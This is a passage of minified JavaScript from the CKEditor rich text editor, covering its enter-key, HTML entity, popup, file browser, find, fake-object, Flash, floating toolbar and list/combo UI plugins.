                        n.moveToElementEditStart(c), void n.select();
                    } else if (c && c.is("pre") && !s) return void I(e, t, n, i);
                    if (r = n.splitBlock(d)) {
                        if (t = r.previousBlock, c = r.nextBlock, l = r.wasStartOfBlock, e = r.wasEndOfBlock,
                        c ? (h = c.getParent()).is("li") && (c.breakParent(h), c.move(c.getNext(), 1)) : t && (h = t.getParent()) && h.is("li") && (t.breakParent(h),
                        h = t.getNext(), n.moveToElementEditStart(h), t.move(t.getPrevious())), l || e) {
                            if (t ? (t.is("li") || !O.test(t.getName()) && !t.is("pre")) && (o = t.clone()) : c && (o = c.clone()),
                            o ? i && !o.is("li") && o.renameNode(d) : h && h.is("li") ? o = h : (o = a.createElement(d),
                            t && (u = t.getDirection()) && o.setAttribute("dir", u)), a = r.elementPath) for (i = 0,
                            d = a.elements.length; i < d && !(h = a.elements[i]).equals(a.block) && !h.equals(a.blockLimit); i++) CKEDITOR.dtd.$removeEmpty[h.getName()] && (h = h.clone(),
                            o.moveChildren(h), o.append(h));
                            o.appendBogus(), o.getParent() || n.insertNode(o), o.is("li") && o.removeAttribute("value"),
                            !CKEDITOR.env.ie || !l || e && t.getChildCount() || (n.moveToElementEditStart(e ? t : o),
                            n.select()), n.moveToElementEditStart(l && !e ? c : o);
                        } else c.is("li") && ((o = n.clone()).selectNodeContents(c), (o = new CKEDITOR.dom.walker(o)).evaluator = function(e) {
                            return !(C(e) || T(e) || e.type == CKEDITOR.NODE_ELEMENT && e.getName() in CKEDITOR.dtd.$inline && !(e.getName() in CKEDITOR.dtd.$empty));
                        }, (h = o.next()) && h.type == CKEDITOR.NODE_ELEMENT && h.is("ul", "ol") && (CKEDITOR.env.needsBrFiller ? a.createElement("br") : a.createText(" ")).insertBefore(h)),
                        c && n.moveToElementEditStart(c);
                        n.select(), n.scrollIntoView();
                    }
                }
                var g, E;
            },
            enterBr: function(e, t, n, i) {
                if (n = n || p(e)) {
                    var o = n.document, a = n.checkEndOfBlock(), r = new CKEDITOR.dom.elementPath(e.getSelection().getStartElement()), s = r.block, l = s && r.block.getName();
                    i || "li" != l ? (!i && a && O.test(l) ? (a = s.getDirection()) ? ((o = o.createElement("div")).setAttribute("dir", a),
                    o.insertAfter(s), n.setStart(o, 0)) : (o.createElement("br").insertAfter(s), CKEDITOR.env.gecko && o.createText("").insertAfter(s),
                    n.setStartAt(s.getNext(), CKEDITOR.env.ie ? CKEDITOR.POSITION_BEFORE_START : CKEDITOR.POSITION_AFTER_START)) : (e = "pre" == l && CKEDITOR.env.ie && CKEDITOR.env.version < 8 ? o.createText("\r") : o.createElement("br"),
                    n.deleteContents(), n.insertNode(e), CKEDITOR.env.needsBrFiller ? (o.createText("\ufeff").insertAfter(e),
                    a && (s || r.blockLimit).appendBogus(), e.getNext().$.nodeValue = "", n.setStartAt(e.getNext(), CKEDITOR.POSITION_AFTER_START)) : n.setStartAt(e, CKEDITOR.POSITION_AFTER_END)),
                    n.collapse(!0), n.select(), n.scrollIntoView()) : c(e, t, n, i);
                }
            }
        };
        var e = CKEDITOR.plugins.enterkey, I = e.enterBr, c = e.enterBlock, O = /^h[1-6]$/;
    }(), function() {
        function c(e, i) {
            var o = {}, a = [], r = {
                nbsp: " ",
                shy: "­",
                gt: ">",
                lt: "<",
                amp: "&",
                apos: "'",
                quot: '"'
            };
            if (e = e.replace(/\b(nbsp|shy|gt|lt|amp|apos|quot)(?:,|$)/g, function(e, t) {
                var n = i ? "&" + t + ";" : r[t];
                return o[n] = i ? r[t] : "&" + t + ";", a.push(n), "";
            }), !i && e) {
                e = e.split(",");
                var t, n = document.createElement("div");
                for (n.innerHTML = "&" + e.join(";&") + ";", t = n.innerHTML, n = null, n = 0; n < t.length; n++) {
                    var s = t.charAt(n);
                    o[s] = "&" + e[n] + ";", a.push(s);
                }
            }
            return o.regex = a.join(i ? "|" : ""), o;
        }
        CKEDITOR.plugins.add("entities", {
            afterInit: function(e) {
                function t(e) {
                    return s[e];
                }
                function n(e) {
                    return "force" != i.entities_processNumerical && a[e] ? a[e] : "&#" + e.charCodeAt(0) + ";";
                }
                var i = e.config;
                if (e = (e = e.dataProcessor) && e.htmlFilter) {
                    var o = [];
                    !1 !== i.basicEntities && o.push("nbsp,gt,lt,amp"), i.entities && (o.length && o.push("quot,iexcl,cent,pound,curren,yen,brvbar,sect,uml,copy,ordf,laquo,not,shy,reg,macr,deg,plusmn,sup2,sup3,acute,micro,para,middot,cedil,sup1,ordm,raquo,frac14,frac12,frac34,iquest,times,divide,fnof,bull,hellip,prime,Prime,oline,frasl,weierp,image,real,trade,alefsym,larr,uarr,rarr,darr,harr,crarr,lArr,uArr,rArr,dArr,hArr,forall,part,exist,empty,nabla,isin,notin,ni,prod,sum,minus,lowast,radic,prop,infin,ang,and,or,cap,cup,int,there4,sim,cong,asymp,ne,equiv,le,ge,sub,sup,nsub,sube,supe,oplus,otimes,perp,sdot,lceil,rceil,lfloor,rfloor,lang,rang,loz,spades,clubs,hearts,diams,circ,tilde,ensp,emsp,thinsp,zwnj,zwj,lrm,rlm,ndash,mdash,lsquo,rsquo,sbquo,ldquo,rdquo,bdquo,dagger,Dagger,permil,lsaquo,rsaquo,euro"),
                    i.entities_latin && o.push("Agrave,Aacute,Acirc,Atilde,Auml,Aring,AElig,Ccedil,Egrave,Eacute,Ecirc,Euml,Igrave,Iacute,Icirc,Iuml,ETH,Ntilde,Ograve,Oacute,Ocirc,Otilde,Ouml,Oslash,Ugrave,Uacute,Ucirc,Uuml,Yacute,THORN,szlig,agrave,aacute,acirc,atilde,auml,aring,aelig,ccedil,egrave,eacute,ecirc,euml,igrave,iacute,icirc,iuml,eth,ntilde,ograve,oacute,ocirc,otilde,ouml,oslash,ugrave,uacute,ucirc,uuml,yacute,thorn,yuml,OElig,oelig,Scaron,scaron,Yuml"),
                    i.entities_greek && o.push("Alpha,Beta,Gamma,Delta,Epsilon,Zeta,Eta,Theta,Iota,Kappa,Lambda,Mu,Nu,Xi,Omicron,Pi,Rho,Sigma,Tau,Upsilon,Phi,Chi,Psi,Omega,alpha,beta,gamma,delta,epsilon,zeta,eta,theta,iota,kappa,lambda,mu,nu,xi,omicron,pi,rho,sigmaf,sigma,tau,upsilon,phi,chi,psi,omega,thetasym,upsih,piv"),
                    i.entities_additional && o.push(i.entities_additional));
                    var a = c(o.join(",")), r = a.regex ? "[" + a.regex + "]" : "a^";
                    delete a.regex, i.entities && i.entities_processNumerical && (r = "[^ -~]|" + r),
                    r = RegExp(r, "g");
                    var s = c("nbsp,gt,lt,amp,shy", !0), l = RegExp(s.regex, "g");
                    e.addRules({
                        text: function(e) {
                            return e.replace(l, t).replace(r, n);
                        }
                    }, {
                        applyToAll: !0,
                        excludeNestedEditable: !0
                    });
                }
            }
        });
    }(), CKEDITOR.config.basicEntities = !0, CKEDITOR.config.entities = !0, CKEDITOR.config.entities_latin = !0,
    CKEDITOR.config.entities_greek = !0, CKEDITOR.config.entities_additional = "#39",
    CKEDITOR.plugins.add("popup"), CKEDITOR.tools.extend(CKEDITOR.editor.prototype, {
        popup: function(e, t, n, i) {
            n = n || "70%", "string" == typeof (t = t || "80%") && 1 < t.length && "%" == t.substr(t.length - 1, 1) && (t = parseInt(window.screen.width * parseInt(t, 10) / 100, 10)),
            "string" == typeof n && 1 < n.length && "%" == n.substr(n.length - 1, 1) && (n = parseInt(window.screen.height * parseInt(n, 10) / 100, 10)),
            t < 640 && (t = 640), n < 420 && (n = 420);
            var o = parseInt((window.screen.height - n) / 2, 10), a = parseInt((window.screen.width - t) / 2, 10), r = (i = (i || "location=no,menubar=no,toolbar=no,dependent=yes,minimizable=no,modal=yes,alwaysRaised=yes,resizable=yes,scrollbars=yes") + ",width=" + t + ",height=" + n + ",top=" + o + ",left=" + a,
            window.open("", null, i, !0));
            if (!r) return !1;
            try {
                -1 == navigator.userAgent.toLowerCase().indexOf(" chrome/") && (r.moveTo(a, o),
                r.resizeTo(t, n)), r.focus(), r.location.href = e;
            } catch (t) {
                window.open(e, null, i, !0);
            }
            return !0;
        }
    }), function() {
        function h(e, t) {
            var n = [];
            if (!t) return e;
            for (var i in t) n.push(i + "=" + encodeURIComponent(t[i]));
            return e + (-1 != e.indexOf("?") ? "&" : "?") + n.join("&");
        }
        function f(e) {
            return (e += "").charAt(0).toUpperCase() + e.substr(1);
        }
        function m() {
            var e = (n = this.getDialog()).getParentEditor();
            e._.filebrowserSe = this;
            var t = e.config["filebrowser" + f(n.getName()) + "WindowWidth"] || e.config.filebrowserWindowWidth || "80%", n = e.config["filebrowser" + f(n.getName()) + "WindowHeight"] || e.config.filebrowserWindowHeight || "70%", i = this.filebrowser.params || {};
            i.CKEditor = e.name, i.CKEditorFuncNum = e._.filebrowserFn, i.langCode || (i.langCode = e.langCode),
            i = h(this.filebrowser.url, i), e.popup(i, t, n, e.config.filebrowserWindowFeatures || e.config.fileBrowserWindowFeatures);
        }
        function g() {
            var e = this.getDialog();
            return e.getParentEditor()._.filebrowserSe = this, !(!e.getContentElement(this.for[0], this.for[1]).getInputElement().$.value || !e.getContentElement(this.for[0], this.for[1]).getAction());
        }
        function E(e, t, n, i) {
            if (i && i.length) for (var o, a = i.length; a--; ) if (("hbox" == (o = i[a]).type || "vbox" == o.type || "fieldset" == o.type) && E(e, t, n, o.children),
            o.filebrowser) if ("string" == typeof o.filebrowser && (o.filebrowser = {
                action: "fileButton" == o.type ? "QuickUpload" : "Browse",
                target: o.filebrowser
            }), "Browse" == o.filebrowser.action) {
                var r = o.filebrowser.url;
                void 0 === r && void 0 === (r = e.config["filebrowser" + f(t) + "BrowseUrl"]) && (r = e.config.filebrowserBrowseUrl),
                r && (o.onClick = m, o.filebrowser.url = r, o.hidden = !1);
            } else if ("QuickUpload" == o.filebrowser.action && o.for && (void 0 === (r = o.filebrowser.url) && void 0 === (r = e.config["filebrowser" + f(t) + "UploadUrl"]) && (r = e.config.filebrowserUploadUrl),
            r)) {
                var s = o.onClick;
                o.onClick = function(e) {
                    var t = e.sender;
                    return (!s || !1 !== s.call(t, e)) && g.call(t, e);
                }, o.filebrowser.url = r, o.hidden = !1, l = e, c = n.getContents(o.for[0]).get(o.for[1]),
                u = void 0, (u = (d = o.filebrowser).params || {}).CKEditor = l.name, u.CKEditorFuncNum = l._.filebrowserFn,
                u.langCode || (u.langCode = l.langCode), c.action = h(d.url, u), c.filebrowser = d;
            }
            var l, c, d, u;
        }
        function o(e, t, n) {
            if (-1 !== n.indexOf(";")) {
                n = n.split(";");
                for (var i = 0; i < n.length; i++) if (o(e, t, n[i])) return !0;
                return !1;
            }
            return (e = e.getContents(t).get(n).filebrowser) && e.url;
        }
        function t(e, t) {
            var n = this._.filebrowserSe.getDialog(), i = this._.filebrowserSe.for, o = this._.filebrowserSe.filebrowser.onSelect;
            i && n.getContentElement(i[0], i[1]).reset(), "function" == typeof t && !1 === t.call(this._.filebrowserSe) || o && !1 === o.call(this._.filebrowserSe, e, t) || ("string" == typeof t && t && alert(t),
            !(e && (n = (i = this._.filebrowserSe).getDialog(), i = i.filebrowser.target || null))) || (i = i.split(":"),
            (o = n.getContentElement(i[0], i[1])) && (o.setValue(e), n.selectPage(i[0])));
        }
        CKEDITOR.plugins.add("filebrowser", {
            requires: "popup",
            init: function(e) {
                e._.filebrowserFn = CKEDITOR.tools.addFunction(t, e), e.on("destroy", function() {
                    CKEDITOR.tools.removeFunction(this._.filebrowserFn);
                });
            }
        }), CKEDITOR.on("dialogDefinition", function(e) {
            if (e.editor.plugins.filebrowser) for (var t, n = e.data.definition, i = 0; i < n.contents.length; ++i) (t = n.contents[i]) && (E(e.editor, e.data.name, n, t.elements),
            t.hidden && t.filebrowser && (t.hidden = !o(n, t.id, t.filebrowser)));
        });
    }(), CKEDITOR.plugins.add("find", {
        requires: "dialog",
        init: function(e) {
            var t = e.addCommand("find", new CKEDITOR.dialogCommand("find"));
            t.canUndo = !1, t.readOnly = 1, e.addCommand("replace", new CKEDITOR.dialogCommand("replace")).canUndo = !1,
            e.ui.addButton && (e.ui.addButton("Find", {
                label: e.lang.find.find,
                command: "find",
                toolbar: "find,10"
            }), e.ui.addButton("Replace", {
                label: e.lang.find.replace,
                command: "replace",
                toolbar: "find,20"
            })), CKEDITOR.dialog.add("find", this.path + "dialogs/find.js"), CKEDITOR.dialog.add("replace", this.path + "dialogs/find.js");
        }
    }), CKEDITOR.config.find_highlight = {
        element: "span",
        styles: {
            "background-color": "#004",
            color: "#fff"
        }
    }, function() {
        function o(e, t) {
            var n = a.exec(e), i = a.exec(t);
            if (n) {
                if (!n[2] && "px" == i[2]) return i[1];
                if ("px" == n[2] && !i[2]) return i[1] + "px";
            }
            return t;
        }
        var r = CKEDITOR.htmlParser.cssStyle, s = CKEDITOR.tools.cssLength, a = /^((?:\d*(?:\.\d+))|(?:\d+))(.*)?$/i, t = {
            elements: {
                $: function(e) {
                    var t = e.attributes;
                    if ((t = (t = (t = t && t["data-cke-realelement"]) && new CKEDITOR.htmlParser.fragment.fromHtml(decodeURIComponent(t))) && t.children[0]) && e.attributes["data-cke-resizable"]) {
                        var n = new r(e).rules, i = (e = t.attributes, n.width);
                        n = n.height, i && (e.width = o(e.width, i)), n && (e.height = o(e.height, n));
                    }
                    return t;
                }
            }
        };
        CKEDITOR.plugins.add("fakeobjects", {
            init: function(e) {
                e.filter.allow("img[!data-cke-realelement,src,alt,title](*){*}", "fakeobjects");
            },
            afterInit: function(e) {
                (e = (e = e.dataProcessor) && e.htmlFilter) && e.addRules(t, {
                    applyToAll: !0
                });
            }
        }), CKEDITOR.editor.prototype.createFakeElement = function(e, t, n, i) {
            var o = (o = this.lang.fakeobjects)[n] || o.unknown;
            return t = {
                class: t,
                "data-cke-realelement": encodeURIComponent(e.getOuterHtml()),
                "data-cke-real-node-type": e.type,
                alt: o,
                title: o,
                align: e.getAttribute("align") || ""
            }, CKEDITOR.env.hc || (t.src = CKEDITOR.tools.transparentImageData), n && (t["data-cke-real-element-type"] = n),
            i && (t["data-cke-resizable"] = i, n = new r(), i = e.getAttribute("width"), e = e.getAttribute("height"),
            i && (n.rules.width = s(i)), e && (n.rules.height = s(e)), n.populate(t)), this.document.createElement("img", {
                attributes: t
            });
        }, CKEDITOR.editor.prototype.createFakeParserElement = function(e, t, n, i) {
            var o, a = (a = this.lang.fakeobjects)[n] || a.unknown;
            return o = new CKEDITOR.htmlParser.basicWriter(), e.writeHtml(o), o = o.getHtml(),
            t = {
                class: t,
                "data-cke-realelement": encodeURIComponent(o),
                "data-cke-real-node-type": e.type,
                alt: a,
                title: a,
                align: e.attributes.align || ""
            }, CKEDITOR.env.hc || (t.src = CKEDITOR.tools.transparentImageData), n && (t["data-cke-real-element-type"] = n),
            i && (t["data-cke-resizable"] = i, i = e.attributes, e = new r(), n = i.width, i = i.height,
            void 0 !== n && (e.rules.width = s(n)), void 0 !== i && (e.rules.height = s(i)),
            e.populate(t)), new CKEDITOR.htmlParser.element("img", t);
        }, CKEDITOR.editor.prototype.restoreRealElement = function(e) {
            if (e.data("cke-real-node-type") != CKEDITOR.NODE_ELEMENT) return null;
            var t = CKEDITOR.dom.element.createFromHtml(decodeURIComponent(e.data("cke-realelement")), this.document);
            if (e.data("cke-resizable")) {
                var n = e.getStyle("width");
                e = e.getStyle("height"), n && t.setAttribute("width", o(t.getAttribute("width"), n)),
                e && t.setAttribute("height", o(t.getAttribute("height"), e));
            }
            return t;
        };
    }(), function() {
        function i(e) {
            return "application/x-shockwave-flash" == (e = e.attributes).type || t.test(e.src || "");
        }
        function o(e, t) {
            return e.createFakeParserElement(t, "cke_flash", "flash", !0);
        }
        var t = /\.swf(?:$|\?)/i;
        CKEDITOR.plugins.add("flash", {
            requires: "dialog,fakeobjects",
            onLoad: function() {
                CKEDITOR.addCss("img.cke_flash{background-image: url(" + CKEDITOR.getUrl(this.path + "images/placeholder.png") + ");background-position: center center;background-repeat: no-repeat;border: 1px solid #a9a9a9;width: 80px;height: 80px;}");
            },
            init: function(e) {
                var t = "object[classid,codebase,height,hspace,vspace,width];param[name,value];embed[height,hspace,pluginspage,src,type,vspace,width]";
                CKEDITOR.dialog.isTabEnabled(e, "flash", "properties") && (t += ";object[align]; embed[allowscriptaccess,quality,scale,wmode]"),
                CKEDITOR.dialog.isTabEnabled(e, "flash", "advanced") && (t += ";object[id]{*}; embed[bgcolor]{*}(*)"),
                e.addCommand("flash", new CKEDITOR.dialogCommand("flash", {
                    allowedContent: t,
                    requiredContent: "embed"
                })), e.ui.addButton && e.ui.addButton("Flash", {
                    label: e.lang.common.flash,
                    command: "flash",
                    toolbar: "insert,20"
                }), CKEDITOR.dialog.add("flash", this.path + "dialogs/flash.js"), e.addMenuItems && e.addMenuItems({
                    flash: {
                        label: e.lang.flash.properties,
                        command: "flash",
                        group: "flash"
                    }
                }), e.on("doubleclick", function(e) {
                    var t = e.data.element;
                    t.is("img") && "flash" == t.data("cke-real-element-type") && (e.data.dialog = "flash");
                }), e.contextMenu && e.contextMenu.addListener(function(e) {
                    if (e && e.is("img") && !e.isReadOnly() && "flash" == e.data("cke-real-element-type")) return {
                        flash: CKEDITOR.TRISTATE_OFF
                    };
                });
            },
            afterInit: function(n) {
                var e = n.dataProcessor;
                (e = e && e.dataFilter) && e.addRules({
                    elements: {
                        "cke:object": function(e) {
                            var t = e.attributes;
                            if (!(t.classid && ("" + t.classid).toLowerCase() || i(e))) {
                                for (t = 0; t < e.children.length; t++) if ("cke:embed" == e.children[t].name) {
                                    if (!i(e.children[t])) break;
                                    return o(n, e);
                                }
                                return null;
                            }
                            return o(n, e);
                        },
                        "cke:embed": function(e) {
                            return i(e) ? o(n, e) : null;
                        }
                    }
                }, 5);
            }
        });
    }(), CKEDITOR.tools.extend(CKEDITOR.config, {
        flashEmbedTagOnly: !1,
        flashAddEmbedTag: !0,
        flashConvertOnEdit: !1
    }), T = CKEDITOR.document.getWindow(), C = CKEDITOR.tools.cssLength, CKEDITOR.plugins.add("floatingspace", {
        init: function(e) {
            e.on("loaded", function() {
                !function(g) {
                    var e = g.config, t = g.fire("uiSpace", {
                        space: "top",
                        html: ""
                    }).html, E = function() {
                        function n(e, t, n) {
                            p.setStyle(t, C(n)), p.setStyle("position", e);
                        }
                        function i(e) {
                            var t = a.getDocumentPosition();
                            switch (e) {
                              case "top":
                                n("absolute", "top", t.y - c - h);
                                break;

                              case "pin":
                                n("fixed", "top", m);
                                break;

                              case "bottom":
                                n("absolute", "top", t.y + (s.height || s.bottom - s.top) + h);
                            }
                            o = e;
                        }
                        var o, a, r, s, l, c, d, u = e.floatSpaceDockedOffsetX || 0, h = e.floatSpaceDockedOffsetY || 0, f = e.floatSpacePinnedOffsetX || 0, m = e.floatSpacePinnedOffsetY || 0;
                        return function(e) {
                            if (a = g.editable()) if (e && "focus" == e.name && p.show(), p.removeStyle("left"),
                            p.removeStyle("right"), r = p.getClientRect(), s = a.getClientRect(), l = T.getViewPaneSize(),
                            c = r.height, d = "pageXOffset" in T.$ ? T.$.pageXOffset : CKEDITOR.document.$.documentElement.scrollLeft,
                            o) {
                                var t;
                                i(c + h <= s.top ? "top" : c + h > l.height - s.bottom ? "pin" : "bottom"), e = l.width / 2,
                                e = 0 < s.left && s.right < l.width && s.width > r.width ? "rtl" == g.config.contentsLangDirection ? "right" : "left" : e - s.left > s.right - e ? "left" : "right",
                                r.width > l.width ? (e = "left", t = 0) : (t = "left" == e ? 0 < s.left ? s.left : 0 : s.right < l.width ? l.width - s.right : 0) + r.width > l.width && (e = "left" == e ? "right" : "left",
                                t = 0), p.setStyle(e, C(("pin" == o ? f : u) + t + ("pin" == o ? 0 : "left" == e ? d : -d)));
                            } else i(o = "pin"), E(e);
                        };
                    }();
                    if (t) {
                        var n = new CKEDITOR.template('<div id="cke_{name}" class="cke {id} cke_reset_all cke_chrome cke_editor_{name} cke_float cke_{langDir} ' + CKEDITOR.env.cssClass + '" dir="{langDir}" title="' + (CKEDITOR.env.gecko ? " " : "") + '" lang="{langCode}" role="application" style="{style}"' + (g.title ? ' aria-labelledby="cke_{name}_arialbl"' : " ") + ">" + (g.title ? '<span id="cke_{name}_arialbl" class="cke_voice_label">{voiceLabel}</span>' : " ") + '<div class="cke_inner"><div id="{topId}" class="cke_top" role="presentation">{content}</div></div></div>'), p = CKEDITOR.document.getBody().append(CKEDITOR.dom.element.createFromHtml(n.output({
                            content: t,
                            id: g.id,
                            langDir: g.lang.dir,
                            langCode: g.langCode,
                            name: g.name,
                            style: "display:none;z-index:" + (e.baseFloatZIndex - 1),
                            topId: g.ui.spaceId("top"),
                            voiceLabel: g.title
                        }))), i = CKEDITOR.tools.eventsBuffer(500, E), o = CKEDITOR.tools.eventsBuffer(100, E);
                        p.unselectable(), p.on("mousedown", function(e) {
                            (e = e.data).getTarget().hasAscendant("a", 1) || e.preventDefault();
                        }), g.on("focus", function(e) {
                            E(e), g.on("change", i.input), T.on("scroll", o.input), T.on("resize", o.input);
                        }), g.on("blur", function() {
                            p.hide(), g.removeListener("change", i.input), T.removeListener("scroll", o.input),
                            T.removeListener("resize", o.input);
                        }), g.on("destroy", function() {
                            T.removeListener("scroll", o.input), T.removeListener("resize", o.input), p.clearCustomData(),
                            p.remove();
                        }), g.focusManager.hasFocus && p.show(), g.focusManager.add(p, 1);
                    }
                }(this);
            }, null, null, 20);
        }
    }), CKEDITOR.plugins.add("listblock", {
        requires: "panel",
        onLoad: function() {
            var t = CKEDITOR.addTemplate("panel-list", '<ul role="presentation" class="cke_panel_list">{items}</ul>'), o = CKEDITOR.addTemplate("panel-list-item", '<li id="{id}" class="cke_panel_listItem" role=presentation><a id="{id}_option" _cke_focus=1 hidefocus=true title="{title}" href="javascript:void(\'{val}\')"  {onclick}="CKEDITOR.tools.callFunction({clickFn},\'{val}\'); return false;" role="option">{text}</a></li>'), n = CKEDITOR.addTemplate("panel-list-group", '<h1 id="{id}" class="cke_panel_grouptitle" role="presentation" >{label}</h1>');
            CKEDITOR.ui.panel.prototype.addListBlock = function(e, t) {
                return this.addBlock(e, new CKEDITOR.ui.listBlock(this.getHolderElement(), t));
            }, CKEDITOR.ui.listBlock = CKEDITOR.tools.createClass({
                base: CKEDITOR.ui.panel.block,
                $: function(e, t) {
                    var n = (t = t || {}).attributes || (t.attributes = {});
                    (this.multiSelect = !!t.multiSelect) && (n["aria-multiselectable"] = !0), !n.role && (n.role = "listbox"),
                    this.base.apply(this, arguments), this.element.setAttribute("role", n.role), (n = this.keys)[40] = "next",
                    n[9] = "next", n[38] = "prev", n[CKEDITOR.SHIFT + 9] = "prev", n[32] = CKEDITOR.env.ie ? "mouseup" : "click",
                    CKEDITOR.env.ie && (n[13] = "mouseup"), this._.pendingHtml = [], this._.pendingList = [],
                    this._.items = {}, this._.groups = {};
                },
                _: {
                    close: function() {
                        if (this._.started) {
                            var e = t.output({
                                items: this._.pendingList.join("")
                            });
                            this._.pendingList = [], this._.pendingHtml.push(e), delete this._.started;
                        }
                    },
                    getClick: function() {
                        return this._.click || (this._.click = CKEDITOR.tools.addFunction(function(e) {
                            var t = this.toggle(e);
                            this.onClick && this.onClick(e, t);
                        }, this)), this._.click;
                    }
                },
                proto: {
                    add: function(e, t, n) {
                        var i = CKEDITOR.tools.getNextId();
                        this._.started || (this._.started = 1, this._.size = this._.size || 0), e = {
                            id: this._.items[e] = i,
                            val: CKEDITOR.tools.htmlEncodeAttr(e).replace(/\'/g, "\\'"),
                            onclick: CKEDITOR.env.ie ? 'onclick="return false;" onmouseup' : "onclick",
                            clickFn: this._.getClick(),
                            title: CKEDITOR.tools.htmlEncodeAttr(n || e),
                            text: t || e
                        }, this._.pendingList.push(o.output(e));
                    },
                    startGroup: function(e) {
                        this._.close();
                        var t = CKEDITOR.tools.getNextId();
                        this._.groups[e] = t, this._.pendingHtml.push(n.output({
                            id: t,
                            label: e
                        }));
                    },
                    commit: function() {
                        this._.close(), this.element.appendHtml(this._.pendingHtml.join("")), delete this._.size,
                        this._.pendingHtml = [];
                    },
                    toggle: function(e) {
                        var t = this.isMarked(e);
                        return t ? this.unmark(e) : this.mark(e), !t;
                    },
                    hideGroup: function(e) {
                        var t = (e = this.element.getDocument().getById(this._.groups[e])) && e.getNext();
                        e && (e.setStyle("display", "none"), t && "ul" == t.getName() && t.setStyle("display", "none"));
                    },
                    hideItem: function(e) {
                        this.element.getDocument().getById(this._.items[e]).setStyle("display", "none");
                    },
                    showAll: function() {
                        var e, t = this._.items, n = this._.groups, i = this.element.getDocument();
                        for (e in t) i.getById(t[e]).setStyle("display", "");
                        for (var o in n) e = (t = i.getById(n[o])).getNext(), t.setStyle("display", ""),
                        e && "ul" == e.getName() && e.setStyle("display", "");
                    },
                    mark: function(e) {
                        this.multiSelect || this.unmarkAll(), e = this._.items[e];
                        var t = this.element.getDocument().getById(e);
                        t.addClass("cke_selected"), this.element.getDocument().getById(e + "_option").setAttribute("aria-selected", !0),
                        this.onMark && this.onMark(t);
                    },
                    unmark: function(e) {
                        var t = this.element.getDocument(), n = (e = this._.items[e], t.getById(e));
                        n.removeClass("cke_selected"), t.getById(e + "_option").removeAttribute("aria-selected"),
                        this.onUnmark && this.onUnmark(n);
                    },
                    unmarkAll: function() {
                        var e, t = this._.items, n = this.element.getDocument();
                        for (e in t) {
                            var i = t[e];
                            n.getById(i).removeClass("cke_selected"), n.getById(i + "_option").removeAttribute("aria-selected");
                        }
                        this.onUnmark && this.onUnmark();
                    },
                    isMarked: function(e) {
                        return this.element.getDocument().getById(this._.items[e]).hasClass("cke_selected");
                    },
                    focus: function(e) {
                        this._.focusIndex = -1;
                        var t, n = this.element.getElementsByTag("a"), i = -1;
                        if (e) {
                            for (t = this.element.getDocument().getById(this._.items[e]).getFirst(); e = n.getItem(++i); ) if (e.equals(t)) {
                                this._.focusIndex = i;
                                break;
                            }
                        } else this.element.focus();
                        t && setTimeout(function() {
                            t.focus();
                        }, 0);
                    }
                }
            });
        }
    }), CKEDITOR.plugins.add("richcombo", {
        requires: "floatpanel,listblock,button",
        beforeInit: function(e) {
            e.ui.addHandler(CKEDITOR.UI_RICHCOMBO, CKEDITOR.ui.richCombo.handler);
        }
    }), function() {
        e = '<span id="{id}" class="cke_combo cke_combo__{name} {cls}" role="presentation"><span id="{id}_label" class="cke_combo_label">{label}</span><a class="cke_combo_button" title="{title}" tabindex="-1"' + (CKEDITOR.env.gecko && !CKEDITOR.env.hc ? "" : " href=\"javascript:void('{titleJs}')\"") + ' hidefocus="true" role="button" aria-labelledby="{id}_label" aria-haspopup="true"',
        CKEDITOR.env.gecko && CKEDITOR.env.mac && (e += ' onkeypress="return false;"'),
        CKEDITOR.env.gecko && (e += ' onblur="this.style.cssText = this.style.cssText;"');
        var e = e + ' onkeydown="return CKEDITOR.tools.callFunction({keydownFn},event,this);" onfocus="return CKEDITOR.tools.callFunction({focusFn},event);" ' + (CKEDITOR.env.ie ? 'onclick="return false;" onmouseup' : "onclick") + '="CKEDITOR.tools.callFunction({clickFn},this);return false;"><span id="{id}_text" class="cke_combo_text cke_combo_inlinelabel">{label}</span><span class="cke_combo_open"><span class="cke_combo_arrow">' + (CKEDITOR.env.hc ? "&#9660;" : CKEDITOR.env.air ? "&nbsp;" : "") + "</span></span></a></span>", u = CKEDITOR.addTemplate("combo", e);
        CKEDITOR.UI_RICHCOMBO = "richcombo", CKEDITOR.ui.richCombo = CKEDITOR.tools.createClass({
            $: function(e) {
                CKEDITOR.tools.extend(this, e, {
                    canGroup: !1,
                    title: e.label,
                    modes: {
                        wysiwyg: 1
                    },
                    editorFocus: 1
                }), e = this.panel || {}, delete this.panel, this.id = CKEDITOR.tools.getNextNumber(),
                this.document = e.parent && e.parent.getDocument() || CKEDITOR.document, e.className = "cke_combopanel",
                e.block = {
                    multiSelect: e.multiSelect,
                    attributes: e.attributes
                }, e.toolbarRelated = !0, this._ = {
                    panelDefinition: e,
                    items: {}
                };
            },
            proto: {
                renderHtml: function(e) {
                    var t = [];
                    return this.render(e, t), t.join("");
                },
                render: function(i, e) {
                    function t() {
                        if (this.getState() != CKEDITOR.TRISTATE_ON) {
                            var e = this.modes[i.mode] ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED;
                            i.readOnly && !this.readOnly && (e = CKEDITOR.TRISTATE_DISABLED), this.setState(e),
                            this.setValue(""), e != CKEDITOR.TRISTATE_DISABLED && this.refresh && this.refresh();
                        }
                    }
                    var n = CKEDITOR.env, o = "cke_" + this.id, a = CKEDITOR.tools.addFunction(function(e) {
                        d && (i.unlockSelection(1), d = 0), s.execute(e);
                    }, this), r = this, s = {
                        id: o,
                        combo: this,
                        focus: function() {
                            CKEDITOR.document.getById(o).getChild(1).focus();
                        },
                        execute: function(e) {
                            var t = r._;
                            if (t.state != CKEDITOR.TRISTATE_DISABLED) if (r.createPanel(i), t.on) t.panel.hide(); else {
                                r.commit();
                                var n = r.getValue();
                                n ? t.list.mark(n) : t.list.unmarkAll(), t.panel.showBlock(r.id, new CKEDITOR.dom.element(e), 4);
                            }
                        },
                        clickFn: a
                    };
                    i.on("activeFilterChange", t, this), i.on("mode", t, this), i.on("selectionChange", t, this),
                    !this.readOnly && i.on("readOnly", t, this);
                    var l = CKEDITOR.tools.addFunction(function(e, t) {
                        var n = (e = new CKEDITOR.dom.event(e)).getKeystroke();
                        switch (40 == n && i.once("panelShow", function(e) {
                            e.data._.panel._.currentBlock.onKeyDown(40);
                        }), n) {
                          case 13:
                          case 32:
                          case 40:
                            CKEDITOR.tools.callFunction(a, t);
                            break;

                          default:
                            s.onkey(s, n);
                        }
                        e.preventDefault();
                    }), c = CKEDITOR.tools.addFunction(function() {
                        s.onfocus && s.onfocus();
                    }), d = 0;
                    return s.keyDownFn = l, n = {
                        id: o,
